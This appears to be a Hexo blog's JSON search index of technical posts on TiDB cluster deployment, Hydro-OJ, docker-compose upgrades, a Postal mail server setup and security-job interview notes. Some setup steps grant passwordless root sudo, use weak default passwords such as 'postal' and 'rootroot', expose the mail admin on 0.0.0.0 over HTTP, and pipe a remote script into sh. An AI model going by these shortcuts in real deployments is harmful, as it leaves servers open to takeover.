OperationalError: ENOENT: no such file or directory, open ‘/Users/xiabee/Desktop/GitHub/gitpage/db.json’ ​ 找不到数据库文件 db.json，导致操作失败 解决方案 折腾了很久，只在一个古老 issue 中找到了类似问题，但是并没有合适的解决方案——然后尝试了一下更新 npm，就莫名其妙解决了…… 123cd xiabee.github.io# 进入 hexo 根目录npm update 最终效果页面渲染与推送执行成功：","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.xiabee.cn/tags/linux/"},{"name":"hexo","slug":"hexo","permalink":"https://blog.xiabee.cn/tags/hexo/"},{"name":"algolia","slug":"algolia","permalink":"https://blog.xiabee.cn/tags/algolia/"}]},{"title":"Build Distributed TiDB System","slug":"coding/Build Distributed TiDB System","date":"2022-08-08T04:00:23.000Z","updated":"2022-08-14T15:00:50.195Z","comments":true,"path":"posts/tidb-build-up/","link":"","permalink":"https://blog.xiabee.cn/posts/tidb-build-up/","excerpt":"","text":"BackgroudTiDB is an open-source NewSQL database that supports Hybrid Transactional and Analytical Processing (HTAP) workloads. Please refer to the official document to see the details Server preparingWe use several ECS to build the real distributed system, instead of distributed service on one server. If you want to simulate production deployment on a single machine, refer to the ofiicial doc of quick start Ensure the following: All ECS can intercommunicate through their Fire-Walls You can log in to all servers as root In this article, we use 3 ECS as an example . Their IP addresses are as follows: 12310.2.103.14910.2.103.8110.2.103.43 Login to ECSWe logined to all ECS with public keys, the key-pairs are stored as ~/.ssh/jinshan and ~/.ssh/jinshan.pub. 123ssh -i ~/.ssh/jinshan_rsa root@10.2.103.43# ssh -i ~/.ssh/jinshan_rsa root@10.2.103.149# ssh -i ~/.ssh/jinshan_rsa root@10.2.103.81 SSH mutual trustLog in to the target machine respectively using the root user account, create the tidb user and set the login password. 12useradd tidb &amp;&amp; \\passwd tidb To configure sudo without password, run the following command, and add tidb ALL=(ALL) NOPASSWD: ALL to the end of the file: 12visudotidb ALL=(ALL) NOPASSWD: ALL Use the tidb user to log in to the control machine, and run the following command. Replace 10.2.103.43 with the IP of your target machine, and enter the tidb user password of the target machine as prompted. After the command is executed, SSH mutual trust is already created. This applies to other machines as well. Newly created tidb users do not have the .ssh directory. To create such a directory, execute the command that generates the RSA key. To deploy TiDB components on the control machine, configure mutual trust for the control machine and the control machine itself. 12ssh-keygen -t rsassh-copy-id -i ~/.ssh/id_rsa.pub 10.2.103.43 Log in to the control machine using the tidb user account, and log in to the IP of the target machine using ssh. If you do not need to enter the password and can successfully log in, then the SSH mutual trust is successfully configured. 1ssh 10.2.103.43 Attention: if you have problem with copying keys remotely, try to login to the target and write the keys to ~/.ssh/authorized_keys manually. OthersFor futher development, please refer to the TiDB Environment and System Configuration Check. Install TiUPStarting with TiDB 4.0, TiUP, as the package manager, makes it far easier to manage different cluster components in the TiDB ecosystem. Now you can run any component with only a single line of TiUP commands.You can refer to the tiup document to see the details. Install the package1curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://tiup-mirrors.pingcap.com/install.sh | sh Reload the shell profileAbove command installs TiUP in the $HOME/.tiup folder. The installed components and the data generated by their operation are also placed in this folder. This command also automatically adds $HOME/.tiup/bin to the PATH environment variable in the Shell .profile file, so you can use TiUP directly. Deploy clustersWrite the configuration filesReferring to complex-multi-instance.yaml and tiup documents, we write the yaml like this: Click here to expand / collapse details ## Global variables are applied to all deployments and used as the default value of ## the deployments if a specific deployment value is missing. global: user: \"tidb\" ssh_port: 22 deploy_dir: \"/tidb-deploy\" data_dir: \"/tidb-data\" monitored: node_exporter_port: 9100 blackbox_exporter_port: 9115 deploy_dir: \"/tidb-deploy/monitored-9100\" data_dir: \"/tidb-data-monitored-9100\" log_dir: \"/tidb-deploy/monitored-9100/log\" server_configs: tidb: log.slow-threshold: 300 tikv: readpool.unified.max-thread-count: 1 readpool.storage.use-unified-pool: true readpool.coprocessor.use-unified-pool: true storage.block-cache.capacity: 8GB raftstore.capacity: 250GB pd: replication.location-labels: [\"resource_pool\", \"host\"] schedule.leader-schedule-limit: 4 schedule.region-schedule-limit: 2048 schedule.replica-schedule-limit: 64 pd_servers: - host: 10.2.103.43 - host: 10.2.103.81 - host: 10.2.103.149 tidb_servers: - host: 10.2.103.43 port: 4000 status_port: 10080 deploy_dir: \"/tidb-deploy/tidb-4000\" log_dir: \"/tidb-deploy/tidb-4000/log\" # numa_node: \"0\" - host: 10.2.103.43 port: 4001 status_port: 10081 deploy_dir: \"/tidb-deploy/tidb-4001\" log_dir: \"/tidb-deploy/tidb-4001/log\" # numa_node: \"1\" - host: 10.2.103.81 port: 4000 status_port: 10080 deploy_dir: \"/tidb-deploy/tidb-4000\" log_dir: \"/tidb-deploy/tidb-4000/log\" # numa_node: \"0\" - host: 10.2.103.81 port: 4001 status_port: 10081 deploy_dir: \"/tidb-deploy/tidb-4001\" log_dir: \"/tidb-deploy/tidb-4001/log\" # numa_node: \"1\" - host: 10.2.103.149 port: 4000 status_port: 10080 deploy_dir: \"/tidb-deploy/tidb-4000\" log_dir: \"/tidb-deploy/tidb-4000/log\" # numa_node: \"0\" - host: 10.2.103.149 port: 4001 status_port: 10081 deploy_dir: \"/tidb-deploy/tidb-4001\" log_dir: \"/tidb-deploy/tidb-4001/log\" # numa_node: \"1\" tikv_servers: - host: 10.2.103.43 port: 20160 status_port: 20180 deploy_dir: \"/tidb-deploy/tikv-20160\" data_dir: \"/tidb-data/tikv-20160\" log_dir: \"/tidb-deploy/tikv-20160/log\" # numa_node: \"0\" config: server.labels: &#123; host: \"tikv1\" ,resource_pool: \"pool1\"&#125; - host: 10.2.103.43 port: 20161 status_port: 20181 deploy_dir: \"/tidb-deploy/tikv-20161\" data_dir: \"/tidb-data/tikv-20161\" log_dir: \"/tidb-deploy/tikv-20161/log\" # numa_node: \"1\" config: server.labels: &#123; host: \"tikv1\" ,resource_pool: \"pool2\"&#125; - host: 10.2.103.81 port: 20160 status_port: 20180 deploy_dir: \"/tidb-deploy/tikv-20160\" data_dir: \"/tidb-data/tikv-20160\" log_dir: \"/tidb-deploy/tikv-20160/log\" # numa_node: \"0\" config: server.labels: &#123; host: \"tikv2\" ,resource_pool: \"pool1\"&#125; - host: 10.2.103.81 port: 20161 status_port: 20181 deploy_dir: \"/tidb-deploy/tikv-20161\" data_dir: \"/tidb-data/tikv-20161\" log_dir: \"/tidb-deploy/tikv-20161/log\" # numa_node: \"1\" config: server.labels: &#123; host: \"tikv2\" ,resource_pool: \"pool2\"&#125; - host: 10.2.103.149 port: 20160 status_port: 20180 deploy_dir: \"/tidb-deploy/tikv-20160\" data_dir: \"/tidb-data/tikv-20160\" log_dir: \"/tidb-deploy/tikv-20160/log\" # numa_node: \"0\" config: server.labels: &#123; host: \"tikv3\" ,resource_pool: \"pool1\"&#125; - host: 10.2.103.149 port: 20161 status_port: 20181 deploy_dir: \"/tidb-deploy/tikv-20161\" data_dir: \"/tidb-data/tikv-20161\" log_dir: \"/tidb-deploy/tikv-20161/log\" # numa_node: \"1\" config: server.labels: &#123; host: \"tikv3\",resource_pool: \"pool2\" &#125; monitoring_servers: - host: 10.2.103.43 # ssh_port: 22 # port: 9090 # deploy_dir: \"/tidb-deploy/prometheus-8249\" # data_dir: \"/tidb-data/prometheus-8249\" # log_dir: \"/tidb-deploy/prometheus-8249/log\" grafana_servers: - host: 10.2.103.43 # port: 3000 # deploy_dir: /tidb-deploy/grafana-3000 alertmanager_servers: - host: 10.2.103.43 # ssh_port: 22 # web_port: 9093 # cluster_port: 9094 # deploy_dir: \"/tidb-deploy/alertmanager-9093\" # data_dir: \"/tidb-data/alertmanager-9093\" # log_dir: \"/tidb-deploy/alertmanager-9093/log\" Check and deploy12345tiup cluster check ./complex-multi-instance.yaml --apply --user tidb -i /home/tidb/.ssh/id_rsatiup cluster deploy xiabee v6.1.0 ./complex-multi-instance.yaml --user tidb -i /home/tidb/.ssh/id_rsa# deploytiup cluster start xiabee --init# init Refering to deploy document to see the details. After initiation, you will see the password of root. Display clusters1234tiup cluster list# to display all cluster namestiup cluster display xiabee# to display certain cluster&#x27;s details Then check the dashboard to see the topology: Refference https://docs.pingcap.com/tidb/stable/overview https://docs.pingcap.com/tidb/stable/check-before-deployment https://docs.pingcap.com/tidb/stable/tiup-overview https://docs.pingcap.com/tidb/stable/production-deployment-using-tiup","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"tidb","slug":"tidb","permalink":"https://blog.xiabee.cn/tags/tidb/"},{"name":"linux","slug":"linux","permalink":"https://blog.xiabee.cn/tags/linux/"}]},{"title":"Hydro-OJ 使用说明","slug":"coding/Hydro-OJ使用说明","date":"2022-05-21T02:00:23.000Z","updated":"2022-08-14T03:01:57.629Z","comments":true,"path":"posts/hydro-hepler/","link":"","permalink":"https://blog.xiabee.cn/posts/hydro-hepler/","excerpt":"","text":"本OJ的具体搭建方式：Docker搭建Hydro-OJ系统 · xiabee-瞎哔哔 以下内容为用户文档 超级管理员 超级管理员是OJ系统的最高权限，能够直接控制OJ的全部内容，不建议设置多个 使用要求· 拥有服务器ssh权限，且能够直接控制服务器容器 创建方法 在OJ右上角注册一个账号，此时账号的UID为2· 回到服务器的终端，使用 docker oj-backend exec -it hydrooj cli user setSuperAdmin 2 将 UID 为 2 的用户设置为超级管理员。 使用 docker oj-backend exec -it pm2 restart hydrooj 重启以使管理员更改立刻生效。 前往 “题库” 面板，查看创建的示例题目是否正常工作。 设置角色 管理域-&gt;管理用户-&gt;添加用户 输入用户UID或者用户名，设置其角色 目前已设置好的角色为老师和学生： 自动加域 设置加域链接：注册后点击链接直接加入 维护方法 具体内容详见官方文档：维护 | Hydro Teacher 老师常用模块为创建/删除题目、创建/删除训练、创建/删除作业 未自动加域的老师，可以联系超级管理员，手动加入域中 创建题目 题库-&gt;创建题目 填写相关信息和描述，并翻到最下方，点击创建 若未填写分组，则默认分配至当前组 添加测试数据和附件 测试数据文件格式（手动） 对于一般的题目，只需提供 .in 和 .out/.ans 文件 文件名中必须含有数字，如1.in和1.out。形如 sample.in 的文件是不会被自动识别 例如手动上传如下文件： 1234567.├── a1.in├── a1.out├── a2.in├── a2.out├── a3.in└── a3.out 测试数据将被自动识别，并使用 1S 256MB 的限制。 测试数据文件格式（自动） 上传config.yaml（推荐通过评测设置在线编辑题目配置） config.yaml文件格式如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# 题目类型，可以为 default(比对输出，可以含spj), objective(客观题), interactive(交互题)type: default# 全局时空限制（此处的限制优先级低于测试点的限制）time: 1smemory: 128m# 输入输出文件名（例：使用 foo.in 和 foo.out），若使用标准 IO 删除此配置项即可filename: foo# 此部分设置当题目类型为 default 时生效# 比较器类型，支持的值有 default（直接比对，忽略行末空格和文件末换行）, ccr, cena, hustoj, lemon, qduoj, syzoj, testlib(比较常用)checker_type: default# 比较器文件（当比较器类型不为 default 时填写）# 文件路径（位于压缩包中的路径）# 将通过扩展名识别语言，与编译命令处一致。在默认配置下，C++ 扩展名应为 .cc 而非 .cppchecker: chk.cc# 此部分设置当题目类型为interactive时生效# 交互器路径（位于压缩包中的路径）interactor: interactor.cc# Extra files 额外文件# These files will be copied to the working directory 这些文件将被复制到工作目录。# 提示：您无需手动上传 testlib.h。user_extra_files: - extra_input.txtjudge_extra_files: - extra_file.txt# Test Cases 测试数据列表# If neither CASES or SUBTASKS are set(or config.yaml doesn&#x27;t exist), judge will try to locate them automaticly.# 如果 CASES 和 SUBTASKS 都没有设置或 config.yaml 不存在， 系统会自动尝试识别数据点。# We support these names for auto mode: 自动识别支持以下命名方式：# 1. [name(optional)][number].(in/out/ans) RegExp: /^([a-zA-Z]*)([0-9]+).in$/# examples: # - c1.in / c1.out# - 1.in / 1.out# - c1.in / c1.ans# 2. input[number].txt / output[number].txt RegExp: /^(input)([0-9]+).txt$/# - example: input1.txt / input2.txt## The CASES option has higher priority than the SUBTASKS option!# 在有 CASES 设置项时，不会读取 SUBTASKS 设置项！## The CASES option has been deprecated in the new version, please use the more personalized SUBTASKS!# CASES 已于新版本中被废弃，请使用个性化程度更高的SUBTASKS！# score: 50 # 单个测试点分数# time: 1s # 时间限制# memory: 256m # 内存限制# cases:# - input: abc.in# output: def.out# - input: ghi.in# output: jkl.out# 或使用Subtask项：subtasks: - score: 30 type: min # 可选 min/max/sum，分别表示取所有测试点最小值、所有测试点最大值、所有测试点之和 time: 1s memory: 64m cases: - time: 0.5s memory: 32m # 可对单个测试点单独设置时间限制和内存限制 input: a.in output: a.out - input: b.in output: b.out - score: 70 time: 0.5s memory: 32m if: [0] # 可选，传入数组，表示仅在subtask0通过时此subtask才计分 cases: - input: c.in output: c.out - input: d.in output: d.out# 提交语言限制# 列举出所有本题允许使用的语言对应的代码（需要和评测机 lang.yaml 内的语言代码相同）# 使用语言ID而非名称！对于有子类的选项，请详细至子分类！langs: - c - cc - cc.cc11o2 可以在官方题库中下载数据进行参考 创建作业 作业-&gt;创建作业 设置相关字段： 创建比赛 同上 Students 创建账号 点击自动加域链接，加入域中 可以认领作业、参加比赛、发布题解等 Refference 用户文档 | Hydro Docker搭建Hydro-OJ系统 · xiabee-瞎哔哔","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"oj","slug":"oj","permalink":"https://blog.xiabee.cn/tags/oj/"},{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"}]},{"title":"安装 docker-compose 2","slug":"coding/安装docker-compose 2","date":"2022-05-08T04:00:23.000Z","updated":"2022-08-13T16:32:35.729Z","comments":true,"path":"posts/docker-compose-2/","link":"","permalink":"https://blog.xiabee.cn/posts/docker-compose-2/","excerpt":"","text":"前期提要上期我们讲到，postal的安装需要高版本的docker-compose。 大部分情况下，我们直接使用包管理安装即可，但是我在安装过程中遇到了包管理器中没有高版本的情况……所以写下本篇记录一下。 本篇依然以Ubuntu/Debian为例。 查看版本1docker-compose -v 此时看到我们的版本是1.25.0，是低于2.0的，无法运行3.9及以上的docker-compose.yml 安装方式（一） 可以参考官网 这里使用一种比较暴力的安装方式：直接手动下载可执行文件 查看最新版本浏览器访问docker-compose的代码仓库（可能需要翻墙） 截至目前，最高版本是2.5.0。 下载文件然后从发布的二进制文件中，找到对应系统的可执行文件，下载下来： 12mkdir -p ~/.docker/cli-plugins/curl -SL https://github.com/docker/compose/releases/download/v2.5.0/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose 上述命令为$HOME目录下的活动用户安装Compose V2。 如果需要为系统中的所有用户安装Docker Compose V2的话则执行： 12mkdir -p /usr/local/lib/docker/cli-pluginscurl -SL https://github.com/docker/compose/releases/download/v2.5.0/docker-compose-linux-x86_64 -o /usr/local/lib/docker/cli-plugins/docker-compose 添加权限1chmod +x ~/.docker/cli-plugins/docker-compose 测试安装123docker compose versiondocker-compose version# 注意此时的两个结果 如果上述两个命令执行结果不同，说明宿主机中已经存在了低版本的docker-compose，而刚刚安装的高版本compose仅作为docker的插件在使用，没有改变/bin中的可执行文件。此时直接安装postal依然会失败的…… 那么就需要更暴力的安装方式：直接替换低版本 安装方式（二）直接替换原来的docker-compose二进制文件。 查看最新版本同上，浏览器访问官网查看即可。 下载文件同上，可以直接手动下载上传给服务器，也可以利用curl下载： 1curl -SL https://github.com/docker/compose/releases/download/v2.5.0/docker-compose-linux-x86_64 -o docker-compose 添加权限1chmod +x docker-compose 查找文件位置1find / -name docker-compose 一般来说在/usr/bin/docker-compose中： 替换文件1sudo cp docker-compose /usr/bin/docker-compose 测试安装1docker-compose -v 此时已经升级到高版本了。","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"},{"name":"postal","slug":"postal","permalink":"https://blog.xiabee.cn/tags/postal/"},{"name":"docker-compose","slug":"docker-compose","permalink":"https://blog.xiabee.cn/tags/docker-compose/"}]},{"title":"Docker 搭建 Postal 邮件系统","slug":"coding/搭建Postal邮件系统","date":"2022-05-08T02:00:23.000Z","updated":"2022-08-13T15:39:31.421Z","comments":true,"path":"posts/postal-mailserver/","link":"","permalink":"https://blog.xiabee.cn/posts/postal-mailserver/","excerpt":"","text":"前情提要上次搭建了一个Hydro-OJ，注册需要邮箱验证，想着要不一步到位顺带把邮件系统也处理了（x） 系统选择有很多酷炫且开源的邮件系统，github上能搜到很多，比如mailcow，postal等。本片主要介绍postal的搭建方式。 Postal 简介 官网：postal 项目地址：GitHub - postalserver/install Postal is a complete and fully featured mail server for use by websites &amp; web servers. Think Sendgrid, Mailgun or Postmark but open source and ready for you to run on your own servers. Postal was developed by Krystal to serve its own mail processing requirements and we have since decided that it should be released as an open source project for the community. 摘自官网，懒癌晚期，就不翻译了（x） 本篇主要讲解如何使用docker进行安装，即如何利用官方推荐的安装方式安装postal邮件系统。 本篇均以Ubuntu/Debian系统为例，其他包管理器的系统可以做类似参考——因为主要工作是容器做的，所以和系统版本不是直接相关。 准备工作服务器配置官方强烈建议服务器至少拥有以下配置： 至少 4GB RAM内存 至少 2 个CPU 核心 至少 100GB 的硬盘空间 但是实测之后发现，如果服务体量不大的话，2~3G内存也是基本够用的，硬盘空间也不需要100G，大硬盘只是用于存储邮件和备份。 另外，邮件系统需要一个可控域名，即需要一个域名，同时需要能够设置子域名。 系统环境12345678sudo apt install git curl jq# 安装所需软件git clone https://postalserver.io/start/install /opt/postal/install# 克隆安装代码sudo ln -s /opt/postal/install/bin/postal /usr/bin/postal# 创建软连接，用于快速启动postal 如果上述命令不能正常执行，可以尝试添加sudo，或者将代码克隆到常规目录下，再利用sudo cp等方式复制到对应目录下。 Docker服务器中已经安装了docker，并且能够以非root身份运行。 123456789sudo apt install docker# 安装dockersudo gpasswd -a $&#123;USER&#125; dockernewgrp - docker# 切换到docker组sudo service docker restart# 重启服务，确保非root用户可以运行docker 不会安装的话可以参考官方文档 如果不能以普通用户运行docker的话可以参考这篇博客：不输入sudo运行Docker · xiabee-瞎哔哔 MariaDB1234567docker run -d \\ --name postal-mariadb \\ -p 127.0.0.1:3306:3306 \\ --restart always \\ -e MARIADB_DATABASE=postal \\ -e MARIADB_ROOT_PASSWORD=postal \\ mariadb 这里直接利用docker运行所需数据库，其中数据库设置为postal，root密码设置为postal；如需修改，直接将MARIADB_DATABASE=xxx和MARIADB_ROOT_PASSWORD=xxx修改掉就行，之后的配置中如果遇到连接服务器的服务，改为对应密码即可。 RabbitMQ12345678docker run -d \\ --name postal-rabbitmq \\ -p 127.0.0.1:5672:5672 \\ --restart always \\ -e RABBITMQ_DEFAULT_USER=postal \\ -e RABBITMQ_DEFAULT_PASS=postal \\ -e RABBITMQ_DEFAULT_VHOST=postal \\ rabbitmq:3.8 同样，利用docker运行消息队列。需要改密码的话将RABBITMQ_DEFAULT_PASS=xxx等改掉即可。 docker-compose 2postal需要利用2.0以上的docker-compose进行安装。 查看docker-compose版本： 12docker-compose version# Docker Compose version v2.4.1 如何安装高版本的docker-compose可以参考这篇博客：安装 docker-compose 2 · xiabee-瞎哔哔 安装过程这里假设我们使用的域名为yourdomain.com 初始化 postal1postal bootstrap postal.yourdomain.com 在初始化之后，需要将postal.yourdomain.com解析到服务器的ip上，如果在本地搭建则解析到localhost或者127.0.0.1上。 同时，上述命令会在 /opt/postal/config中生成三个文件： postal.yml ：主要配置文件 signing.key 各项签名的私钥 Caddyfile Caddy服务器的配置文件（Caddy类似于Nginx，用作代理服务器） 初始化数据库12postal initializepostal make-user 创建第一个用户，执行命令过程中会提示你设置用户名和密码。 运行 postal1postal start 此时会开始运行容器，如果没有相关镜像会直接拉取，耐心等待即可。 注意：需要利用2.0以上的docker-compose进行安装，确保宿主机中的docker-compose版本高于2.0 Caddy (可选)1234567docker run -d \\ --name postal-caddy \\ --restart always \\ --network host \\ -v /opt/postal/config/Caddyfile:/etc/caddy/Caddyfile \\ -v /opt/postal/caddy-data:/data \\ caddy Caddy为代理服务器，可选项很多，比如Nginx，Appache等，甚至可以不装（如果不需要https的话） 最终应该看到这个样子： 1postal status 注意事项上述方法安装的postal服务端运行在5000端口，如果浏览器访问不了的话检查防火墙是否放行该端口的流量。 如果还是不能访问，检查/opt/postal/config目录下的postal.yml，找到web_server模块： 1234web_server: # Specify configuration for the Postal web server bind_address: 127.0.0.1 port: 5000 原文件默认将地址绑定到127.0.0.1，只能在域内访问，从域外访问就会被拦截。如果VPS没有特定设置的话，直接把绑定地址设置为0.0.0.0，允许任何流量即可： 1234web_server: # Specify configuration for the Postal web server bind_address: 0.0.0.0 port: 5000 同时，如果没有设置SSL证书的话，可以把服务协议改为http 12345web: # The host that the management interface will be available on host: postal.yourdomain.com # The protocol that requests to the management interface should happen on protocol: http 最终效果浏览器访问http://postal.yourdomain.com:5000，即可看到以下界面： 到目前为止，postal已经搭建完毕，具体的设置我们下期再写。 Refference https://docs.postalserver.io/","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"},{"name":"postal","slug":"postal","permalink":"https://blog.xiabee.cn/tags/postal/"}]},{"title":"Docker搭建Hydro-OJ系统","slug":"coding/Hydro-Docker","date":"2022-04-29T12:00:23.000Z","updated":"2022-08-13T15:39:31.413Z","comments":true,"path":"posts/hydro-docker/","link":"","permalink":"https://blog.xiabee.cn/posts/hydro-docker/","excerpt":"","text":"Hydro简介 Hydro是目前来看比较新的一款开源Online Judge系统 目前官网有常见的安装方式，但是Docker的支持不是很好，于是我自己在官网架构基础上，重新编写了一下容器部署。 项目地址：Hydro-Docker 使用方式 直接使用docker-compose运行容器，在本地构建镜像 123git clone https://github.com/xiabee/Hydro-Dockercd Hydro-Dockerdocker-compose up -d 没有报错就是成功（x）： 1docker-compose ps 聊聊编写过程 准确的说所有模块的测试完全靠自己，全网没有找到相关的报错，可能是因为官方并不打算提供容器安装的技术支持…… 于是有了以下内容（都是我遇到的bug，大家构建过程中可以参考一下 构建速度较慢 问题描述：如题 解决方案：这个直接给Dockerfile换源就好，找一个合适的源，比如清华源： 123RUN sed -i &quot;s/deb.debian.org/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \\ sed -i &quot;s/security.debian.org/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \\ apt-get update &amp;&amp; apt-get install -y --no-install-recommends &amp;&amp; apt upgrade -y 同时给宿主机配置容器加速器，这里以阿里云、Ubuntu为例： 12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123; &quot;registry-mirrors&quot;: [&quot;https://ee1z0bm0.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker 测评机不响应 问题描述：各个容器运行正常，但是测评机一直处于不工作状态，即提交代码无法测评Error: Request failed with status code 404docker-compose logs | grep judge查看测评机容器日志，发现以下内容：12345678910111213141516171819202122232425oj-judge | Unhandled Rejection at: Promise Promise &#123;oj-judge | &lt;rejected&gt; Error: Request failed with status code 404oj-judge | at createError (/usr/local/share/.config/yarn/global/node_modules/axios/lib/core/createError.js:16:15)oj-judge | at settle (/usr/local/share/.config/yarn/global/node_modules/axios/lib/core/settle.js:17:12)oj-judge | at IncomingMessage.handleStreamEnd (/usr/local/share/.config/yarn/global/node_modules/axios/lib/adapters/http.js:322:11)oj-judge | at IncomingMessage.emit (events.js:412:35)oj-judge | at endReadableNT (internal/streams/readable.js:1334:12)oj-judge | at processTicksAndRejections (internal/process/task_queues.js:82:21) &#123;oj-judge | config: &#123;oj-judge | transitional: [Object],oj-judge | adapter: [Function: httpAdapter],oj-judge | transformRequest: [Array],oj-judge | transformResponse: [Array],oj-judge | timeout: 30000,oj-judge | xsrfCookieName: &#x27;XSRF-TOKEN&#x27;,oj-judge | xsrfHeaderName: &#x27;X-XSRF-TOKEN&#x27;,oj-judge | maxContentLength: -1,oj-judge | maxBodyLength: -1,oj-judge | validateStatus: [Function: validateStatus],oj-judge | headers: [Object],oj-judge | baseURL: &#x27;http://oj-backend:8888/&#x27;,oj-judge | method: &#x27;post&#x27;,oj-judge | url: &#x27;login&#x27;,oj-judge | data: &#x27;&#123;&quot;uname&quot;:&quot;root&quot;,&quot;password&quot;:&quot;rootroot&quot;,&quot;rememberme&quot;:&quot;on&quot;&#125;&#x27;oj-judge | &#125;, 注意此时报错：oj-judge在不断请求http://oj-backend:8888/，但是返回值一直是404，然而观察到oj-backend并没有暴露8888端口……发现问题所在！ 解决方案：在docker-compose中暴露oj-backend的服务端口：1234567# main site oj-backend: build: ./backend container_name: oj-backend ... expose: - 8888 server User: 0(Guest) get: /judge/files You don’t have the required privilege. [ 512 ]docker-compose logs | grep backend查看后端容器日志，发现以下内容： 12345678oj-backend | [E] server User: 0(Guest) get: /judge/files You don&#x27;t have the required privilege. [ 512 ]oj-backend | [E] server User: 0(Guest) get: /judge/files You don&#x27;t have the required privilege. [ 512 ]oj-backend | [E] server User: 0(Guest) get: /judge/files You don&#x27;t have the required privilege. [ 512 ]oj-backend | [E] server User: 0(Guest) get: /judge/files You don&#x27;t have the required privilege. [ 512 ]oj-backend | [E] server User: 0(Guest) get: /judge/files You don&#x27;t have the required privilege. [ 512 ]oj-backend | [E] server User: 0(Guest) get: /judge/files You don&#x27;t have the required privilege. [ 512 ]oj-backend | [E] server User: 0(Guest) get: /judge/files You don&#x27;t have the required privilege. [ 512 ]oj-backend | [E] server User: 0(Guest) get: /judge/files You don&#x27;t have the required privilege. [ 512 ] 此时推断，测评机在抓取后端请求，但是后端并没有权限写入测评机 结合上面测评机容器请求内容： 12oj-judge | url: &#x27;login&#x27;,oj-judge | data: &#x27;&#123;&quot;uname&quot;:&quot;root&quot;,&quot;password&quot;:&quot;rootroot&quot;,&quot;rememberme&quot;:&quot;on&quot;&#125;&#x27; 推测测评机设置的账号密码与后端不匹配 解决方案：修改./data/judge/judge.yaml将uname和password修改为对应管理员账号的用户名和密码： 1234567hosts: localhost: type: hydro server_url: http://oj-backend:8888/ uname: root password: rootroot detail: true 然后重启容器就可以正常测评了：docker-compose restart 其他问题 暂时不记得了，想起来了来写","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"oj","slug":"oj","permalink":"https://blog.xiabee.cn/tags/oj/"},{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"}]},{"title":"2022春招安全岗记录","slug":"coding/面试记录","date":"2022-03-08T12:00:23.000Z","updated":"2022-08-13T15:39:31.423Z","comments":true,"path":"posts/2022-spring-recruitment/","link":"","permalink":"https://blog.xiabee.cn/posts/2022-spring-recruitment/","excerpt":"","text":"写在前面在经历了保研、考研两轮大白给之后，终于在春招的时候拿到了满意的offer…… 简历内容是考研之后更新的，大致可以参考我的在线简历：https://xiabee.cn/cv，就是详细描述了一下项目内容和个人贡献。 由于本人对996怨念很深，所以在公司选择上会优先考虑工作时长与作息时间，几乎没有投大厂（虽然顺手投了字节，一面就挂了，我好菜）。一些因为种种原因发了面试邀请但是没能面试的公司就暂时不写了，问就是拒绝996…… 本篇按时间顺序排序，同一公司放在一起写。 最终去向 PingCAP上海，Security PingCAP（已接受）四面2022.2.28 大主管+HRBP面，一共面了约四十五分钟，大主管面了半小时，HRBP面了十五分钟左右。 大主管主要是业务方向，对攻击手段问的不深，主要是防护与架构相关的问题，给我一种我是架构师的错觉（不是） 介绍一下你了解到的C/C++相关漏洞 聊了一下缓冲区溢出 聊了一下和其他业务嵌套时的漏洞 详细聊聊缓冲区溢出 栈溢出 堆溢出（不会） BSS溢出（不会） 缓冲区溢出如何避免 编译时避免 运行时避免 了解GO语言吗 “暂时不了解” “没有关系，那根据你的认识，你认为GO语言有哪些安全漏洞呢” “缓冲区溢出是不可避免的，只是利用难度的区别” 然后提了一下嵌套业务相关的漏洞 刚刚提到的其他漏洞如何避免 提到了SQL注入等，“预编译，上WAF” WAF相关，对于某些实体，比如本身就是一段SQL代码，如何防止误报 实体化，权限控制，纯代码直接实体化，使其没有执行权限 不能实体化的代码宁可误报也不放过……（瞎答的） 开放性问题，本公司的攻击面有哪些，应对策略有哪些 具体比较细节了，包括内部攻击外部攻击之类的 回答的比较泛，基于规则/行为/角色等，也对一些具体的服务说了些应对策略 数据安全相关，安全架构相关，如何保障数据安全等 零信任模型 最小权限原则 基于身份/角色的访问控制等 “简历里面提到了容器，你对容器安全有了解吗” 瞎扯了点容器逃逸 “平时接除容器主要是开发，容器安全接除不多” 剩下内容不记得了，大概问了半小时 反问：安全组的人员配置、团队规模等，以及这个凑够一桌麻将开office具体政策 安全团队其实都是remote work，基本上都不在北京…… 开office的政策由HRBP解答的，确实有，也可以在南昌开，凑够人就行。 HRPB基本上没有涉及技术问题，中途聊了一下作品赛，可能是提到了数据安全，HRPB对这个比较感兴趣（x） 在北京吗 有无实习打算 是否为独生子女 有无考研打算 回应了一下刚刚开office的问题 还有没有其他公司的offer 对公司的选择是怎么样的 为什么觉得PingCAP是dream company 反问环节问了一下怎么不谈薪资……“下一轮会有专门的同学和你交流” 三面2022.2.16 项目主管面，总面试时间约50分钟，聊的内容挺多，体验也很不错。 自我介绍 介绍一下项目 SSRF相关 开发过的脚本、项目等 python相关：python是真正的多线程吗 挖过的漏洞 英语相关：用英文介绍一下XSS 英语相关：介绍不出来，介绍一下自己吧 平时安全相关的技术是怎样学习的呢 了解安全咨询的渠道等 实战相关 反问：主管介绍了工作内容、工作组等 反问：实习相关 